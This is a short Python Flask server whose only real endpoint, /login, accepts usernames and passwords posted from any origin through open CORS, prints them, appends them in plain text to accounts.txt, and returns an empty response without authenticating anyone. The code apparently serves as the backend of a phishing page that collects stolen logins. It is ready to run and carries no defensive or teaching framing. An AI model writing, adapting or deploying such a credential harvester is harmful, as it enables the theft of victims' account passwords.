# export FLASK_APP=server.py
# flask run --host=0.0.0.0
import threading
from flask import Flask, request
from flask_cors import CORS, cross_origin

app = Flask(__name__, static_url_path='/static')
CORS(app)

lock = threading.Lock()

@app.after_request
def add_header(response):
    response.cache_control.no_cache = True
    return response

@app.route('/login', methods=['GET', 'POST'])
@cross_origin()
def login():
    # Read user/pass from form data.
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Save credentials.
        if username and password:
            with lock:
                print('NEW LOGIN ' + str(username) + ':' + str(password))
                with open('./accounts.txt', 'a') as f:
                    f.write(str(username) + ':' + str(password) + '\n')
    
    return ''

@app.route('/')
def home():
    return ''

if __name__ == '__main__':
    app.run(debug=True)
